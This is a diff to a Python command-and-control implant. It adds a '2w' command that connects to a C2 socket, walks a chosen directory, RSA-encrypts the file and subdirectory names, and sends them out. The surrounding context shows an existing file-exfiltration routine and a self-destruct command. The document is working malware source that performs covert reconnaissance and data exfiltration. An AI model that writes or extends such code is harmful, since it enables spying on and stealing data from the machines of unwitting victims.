@@ -105,7 +105,6 @@ while(True):
         n = int(command.split(";")[1])
         e = int(command.split(";")[2])
         pubkey = rsa.PublicKey(n,e)
-        print(pubkey)
         
         for line in Lines:
             #exfil the file for each location in Lines
@@ -130,6 +129,52 @@ while(True):
         #in case of error
         except:
             print("error")
+    
+    #exfil paths
+    if(comm == "2w"):
+        # Create a TCP/IP socket
+        c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Connect the socket to the port where the server is listening
+        c2_server_address = ('localhost', 9999)
+        print("Connecting to Socket")
+        c2_socket.connect(c2_server_address)
+
+        directory = command.split(";")[1]
+        print(directory)
+        #rsa key
+        n = int(command.split(";")[2])
+        e = int(command.split(";")[3])
+        pubkey = rsa.PublicKey(n,e)
+        
+        _, directory_walk, file_walk = next(os.walk(directory))
+
+        enc = rsa.encrypt('-----Files-----'.encode('utf8'), pubkey)
+        send_exfil(enc)
+        time.sleep(0.5)
+        for w in file_walk:
+            #encrypt the content before sending it back
+            enc = rsa.encrypt(w.encode('utf8'), pubkey)
+            send_exfil(enc)
+            time.sleep(0.5)
+        
+        enc = rsa.encrypt('-----Immediate Subdirectories-----'.encode('utf8'), pubkey)
+        send_exfil(enc)
+        time.sleep(0.5)
+        for w in directory_walk:
+            #encrypt the content before sending it back
+            enc = rsa.encrypt(w.encode('utf8'), pubkey)
+            send_exfil(enc)
+            time.sleep(0.1)
+            
+        #attempt to close socket
+        try:
+            print("Closing Socket")
+            c2_socket.close()
+        
+        #in case of error
+        except:
+            print("error")
+
 
     if(comm == "1"):
         #self destruct
